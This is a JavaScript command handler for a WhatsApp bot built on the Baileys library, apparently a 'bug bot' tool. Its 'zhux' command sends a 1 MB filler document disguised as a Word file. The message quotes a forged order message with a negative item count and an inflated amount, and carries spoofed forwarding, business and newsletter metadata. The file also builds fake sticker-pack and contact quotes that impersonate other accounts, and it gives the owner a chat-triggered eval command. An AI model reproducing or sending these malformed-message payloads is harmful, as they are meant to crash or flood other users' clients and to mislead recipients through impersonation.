// File: ./case.js
import * as baileys from "@whiskeysockets/baileys";
import {
  downloadContentFromMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  proto
} from "@whiskeysockets/baileys";
import {
 Buffer 
} from "buffer";
import crypto from "crypto";
import chalk from "chalk";
import axios from "axios";
import https from "https";
import util from "util";
import fs from "fs";

export default async function handleMessage(sock, msgUpdate) {
try {
if (!msgUpdate.messages || !msgUpdate.messages.length) return
const m = msgUpdate.messages[0]
if (!m.message) return
const msg = m.message
const getText = (msg) => {
  if (!msg) return ""
  if (msg.ephemeralMessage) {
    msg = msg.ephemeralMessage.message
  }
  if (msg.viewOnceMessageV2) {
    msg = msg.viewOnceMessageV2.message
  }
  return (
    msg.conversation ||
    msg.extendedTextMessage?.text ||
    msg.imageMessage?.caption ||
    msg.videoMessage?.caption ||
    msg.documentMessage?.caption ||
    ""
  )
}
const text = getText(msg)
if (!text) return

const reply = (txt) =>
  sock.sendMessage(m.key.remoteJid, { text: txt }, { quoted: m })

async function getThumbBuffer(url) {
  const res = await axios.get(url, {
    responseType: "arraybuffer"
  })
  return Buffer.from(res.data)
}

const statusMessage = {
  key: {
    remoteJid: "2234030896@g.us",
    fromMe: false,
    id: "ORDER-" + Date.now(),
    participant: "18002428478@s.whatsapp.net",
  },
  message: proto.Message.fromObject({
    orderMessage: {
      orderId: "2136457980",
      itemCount: -2130457980925,
      status: 1,
      surface: 1,
      message: "      🏆-𝗭𝗵𝘂𝗫𝘇𝗩𝗼.𝟵𝟬𝟴 𝝮",
      orderTitle: "Xezstrys Store",
      sellerJid: "13135550002@s.whatsapp.net",
      token: Buffer.from([1, 2, 3, 4]),
      totalAmount1000: 9999999999,
      totalCurrencyCode: "IDR"
    }
  }),
  pushName: "Xezstrys Bot"
};


const sender = m.key.participant || m.key.remoteJid
const isGroup = m.key.remoteJid.endsWith("@g.us")
const isOwner = sender === "269544178327708@lid"

const ctx = msg.extendedTextMessage?.contextInfo
const quoted = msg.extendedTextMessage?.contextInfo?.quotedMessage

global.m = m;
global.msg = msg;
global.sock = sock;
global.reply = reply;
global.ctx = ctx;
global.quoted = ctx?.quotedMessage;
global.groupId = isGroup ? m.key.remoteJid : null;

global.sendWithAdReply = async (jid, message, quotedMessage = statusMessage) => {
  return await sock.sendMessage(
    jid,
    {
      ...message,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "—𝐙𝐞𝐱𝚝𝐫𝐲𝐬 𝐎𝐟𝐟𝐢𝐜𝐚𝐥",
          body: "© 2025-2026",
          mediaType: 2,
          thumbnail: await getThumbBuffer(
    "https://files.catbox.moe/c301uq.jpg"
  ),
          mediaUrl: "t.me/wskyxhouds",
          sourceUrl: "t.me/wskyxhouds"
        }
      }
    },
    { quoted: quotedMessage }
  );
};

if (isOwner && text.startsWith("=>")) {
  const code = text.slice(2).trim();
  if (!code) return;

  try {
    if (code === "m" || code === "msg") {
      const target = global.quoted ? global.quoted : global.m;
      const rawText = util.inspect(target, { depth: 4 });
      await global.sendWithAdReply(m.key.remoteJid, { text: rawText }, statusMessage);
      return;
    }

    const evaled = await eval(`
      (async () => {
        return (${code})
      })()
    `);

    const output =
      typeof evaled === "undefined"
        ? "✅ Executed (no output)"
        : typeof evaled === "string"
        ? evaled
        : util.inspect(evaled, { depth: 4 });

    await reply(output);
  } catch (e) {
    await reply("❌ Eval Error:\n" + e);
  }
  return;
}

const prefix = "."
if (!text.startsWith(prefix)) return
const args = text.slice(prefix.length).trim().split(/ +/)
const command = args.shift().toLowerCase()
   
    const vcard = `BEGIN:VCARD
VERSION:3.0
N:;ttname;;;
FN:ttname
item1.TEL;waid=13135550002:+1 (313) 555-0002
item1.X-ABLabel:Ponsel
END:VCARD`;

    const fakeMenuMetaAiQuoted = {
      key: {
        fromMe: false,
        participant: "13135550002@s.whatsapp.net",
        remoteJid: "status@broadcast",
        id: "XezstrysBot-003"
      },
      message: {
        contactMessage: {
          displayName: "🏆𝗭𝗵𝘂𝗫𝘇 𝘃𝟬.𝟮",
          vcard: vcard
        }
      },
      pushName: "aabbccdd"
    };
    
const fakeStickerPackQuoted = {
  key: {
    remoteJid: "2234030896@g.us",
    fromMe: false,
    id: "SKYXHO-" + Date.now(),
    participant: "18002428478@s.whatsapp.net"
  },

  message: {
    stickerPackMessage: {
      stickerPackId: "SKYXHO-" + Date.now(),
      name: "🕊️ -𝐙𝐡𝐮𝐱 𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫🦠",
      publisher: "Xezstrys",
      stickers: [
        {
          url: null,
          mimetype: "image/webp",
          fileSha256: Buffer.from("AAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDGGGGGGGGGGGGGGGGGGGJHHHJJJHHHHHHHHHHHHHHKKKKKKKKKKKKLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLMMMMMMXXXXXXXXXXXXXBBBBBBBBNBBNNBBBBBBBBBSSSSSDDDDDDZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZVVVVVVVVBVVVVHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJKKKKKKKKKKKKKKKKKKKQQQWWQWQWWQQQW==", "base64"),
          fileEncSha256: Buffer.from("AAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDGGGGGGGGGGGGGGGGGGGJHHHJJJHHHHHHHHHHHHHHKKKKKKKKKKKKLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLMMMMMMXXXXXXXXXXXXXBBBBBBBBNBBNNBBBBBBBBBSSSSSDDDDDDZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZVVVVVVVVBVVVVHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJKKKKKKKKKKKKKKKKKKKQQQWWQWQWWQQQW==", "base64"),
          mediaKey: Buffer.alloc(32),
          fileLength: 252525
        }
      ]
    }
  },

  pushName: "skyxho"
};

const wait = "⏳ tunggu bentar...";
 
 if (!m.key || !m.key.remoteJid) return
 
    switch (command) {

case "zhux": {
const allowedUsers = [
"269544178327708@lid"
];
const sender = m.key.participant || m.key.remoteJid;
const userCommand = command || "unknown";
const userTime = new Date().toLocaleTimeString("id-ID", { hour12: false });
const start = Date.now();
const end = Date.now();
const speed = end - start;
console.log(
chalk.white("\n") + "┏╾" + "<💭>" + "[" + "" +
chalk.bgGreen.black("𝗖𝗢𝗠𝗠𝗔𝗡𝗗") + "" +
chalk.white("]") + " " +
chalk.cyan.bold(`.${userCommand}`) + " <⏰>" +
chalk.bgGray.white.bold(`[${userTime}]`) + " " +
chalk.white(" ") + " " +
chalk.white("\n") + "┣" + 
chalk.yellow.bold(`[ ${sender} ]`) + " " + "©𝗥𝗲𝘅𝘇𝗦𝘂𝗸𝗶" +
chalk.white("\n") + "┗╾≫" + " " +
chalk.white("[") + "" +
chalk.bgRed.black("々") +
chalk.white("]") + " " +
chalk.white.bold("Sending with out message . . .") + " "
);
if (!allowedUsers.includes(sender)) {
await sock.sendMessage(
m.key.remoteJid,
{
text: "*g ad akses lu*",
},
{ quoted: fakeStickerPackQuoted }
);
break;
}
const thumbPath = "./image/whns.jpg";
const thumbExists = fs.existsSync(thumbPath);
const thumbBuffer = thumbExists ? fs.readFileSync(thumbPath) : null;
const text = "https://ẉ.ceo/zhuxz" + "".repeat(25252);
const suki = {
title: "𝗱𝟳𝗲𝗽𝗽𝗲𝗹𝗶.𝗽𝗱𝗳",
body: "© 2025 - 2026",
thumbnail: thumbBuffer,
sourceUrl: "t.me/xvoldz",
mediaType: 1,
renderLargerThumbnail: false,
};
const footer = "t.me/d7eppeli";
const fakeDoc = Buffer.alloc(100 * 100 * 100, "㑒 `𝐅𝐮𝐜𝐤𝐙𝐡𝐮𝐱 || 𝐒𝐢𝐠𝐦𝐚 𝐁𝐨𝐲𝐬 🥵");
const mentions = ['status@broadcast'];
await sock.sendMessage(m.key.remoteJid, { react: { text: "⏳", key: m.key } });
await sock.sendMessage(
m.key.remoteJid,
{
document: fakeDoc,
mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
fileName: "© 𝗭𝗵𝘂𝗫𝘇 𝘃𝟬.𝟮",
caption: text,
footer: footer,
contextInfo: { 
externalAdReply: suki,
mentionedJid: mentions,
ai: false,
forwardingScore: 252,
isForwarded: true,
businessMessageForwardInfo: { 
businessOwnerJid: "13135550002@s.whatsapp.net" },
forwardedNewsletterMessageInfo: {
newsletterJid: "120363405191556298@newsletter",
newsletterName: "🕊️-𝗭𝗵𝘂𝗫𝘇 𝗚𝗻𝗫𝘇-".repeat(1),
serverMessageId: null
},
},
},
{ quoted: statusMessage }
);
await sock.sendMessage(m.key.remoteJid, { react: { text: "🌟", key: m.key } });
console.log(
chalk.white(" ") + " " +
chalk.white("[") + "" +
chalk.bgBlue.black("𝗦𝗧𝗔𝗧𝗨𝗦") + "" +
chalk.white("]") + " " + "<" +
chalk.bgGreen.black("✅") + ">" + " " +
chalk.white.bold("Successfully Send Message . . .") + " "
);
break;
}

case 'balzx': {
  const jid = m.key.remoteJid
  const sender = m.key.participant || jid

  const thumbPath = "./image/whns.jpg"
  const thumbBuffer = fs.existsSync(thumbPath)
    ? fs.readFileSync(thumbPath)
    : Buffer.alloc(0)
  const userTime = new Date().toLocaleTimeString("id-ID", { hour12: false });
  const userJid = m.key.participant || m.key.remoteJid
  const adminSt = "6285601800364@s.whatsapp.net"
  const userTag = adminSt.split("@")[0]
  const userCommand = command || "unknown";
console.log(
chalk.white("\n") + "┏╾" + "<💭>" + "[" + "" +
chalk.bgGreen.black("𝗖𝗢𝗠𝗠𝗔𝗡𝗗") + "" +
chalk.white("]") + " " +
chalk.cyan.bold(`.${userCommand}`) + " <⏰>" +
chalk.bgGray.white.bold(`[${userTime}]`) + " " +
chalk.white(" ") + " " +
chalk.white("\n") + "┣" + 
chalk.yellow.bold(`[ ${sender} ]`) + " " + "©𝗥𝗲𝘅𝘇𝗦𝘂𝗸𝗶" +
chalk.white("\n") + "┗╾≫" + " " +
chalk.white("[") + "" +
chalk.bgRed.black("々") +
chalk.white("]") + " " +
chalk.white.bold("Sending with out message . . .") + " "
);
await sock.sendMessage(m.key.remoteJid, { react: { text: "⏳", key: m.key } })

const agent = new https.Agent({
  keepAlive: false,
  maxSockets: 1
})

const img = await axios.get(
  "https://files.catbox.moe/dzoz7f.jpg",
  {
    responseType: "arraybuffer",
    timeout: 15000,
    httpsAgent: agent,
    headers: {
      "User-Agent": "Mozilla/5.0",
      "Accept": "image/*"
    }
  }
)

await sock.sendMessage(
  jid,
  {
    image: Buffer.from(img.data),
    caption: `> *\`💥\` -𝗭𝗵𝘂𝗫𝘇𝗩𝗼.𝟵𝟬𝟴?!*
*-Привет!* @${userTag}-
 *Я ассистент готовый*
  *помочь вам решить*
     *вашу проблему.*
 
➥ \`𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\`
*❐- 𝗗𝗲𝘃:* ZhuXzVo?!
*-❐ 𝗩𝗲𝗿:* 0.2-Beta
*❐- 𝗕𝗮𝘀𝗲:* ESM/CASE
*-❐ 𝗧𝗲𝗹𝗲:* t.me/xvoldz`,
    mentions: [userJid],
    contextInfo: {
      forwardingScore: 252,
      isForwarded: true,
      externalAdReply: {
        title: "𝗱𝟳𝗲𝗽𝗽𝗲𝗹𝗶.𝗽𝗱𝗳",
        body: "© 2025 - 2026",
        mediaType: 1,
        thumbnail: thumbBuffer,
        renderLargerThumbnail: false,
        showAdAttribution: true,
        sourceUrl: "t.me/xvoldz"
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363405191556298@newsletter",
        newsletterName: "🕊️-𝗭𝗵𝘂𝗫𝘇 𝗚𝗻𝗫𝘇-",
        serverMessageId: null
      }
    }
  },
  { quoted: statusMessage }
)
await sock.sendMessage(m.key.remoteJid, { react: { text: "🌟", key: m.key } })
console.log(
chalk.white(" ") + " " +
chalk.white("[") + "" +
chalk.bgBlue.black("𝗦𝗧𝗔𝗧𝗨𝗦") + "" +
chalk.white("]") + " " + "<" +
chalk.bgGreen.black("✅") + ">" + " " +
chalk.white.bold("Successfully Send Message . . .") + " "
);
break;
}


}
} catch (err) {
console.error("⚠️ Error di case.js :", err);
}
}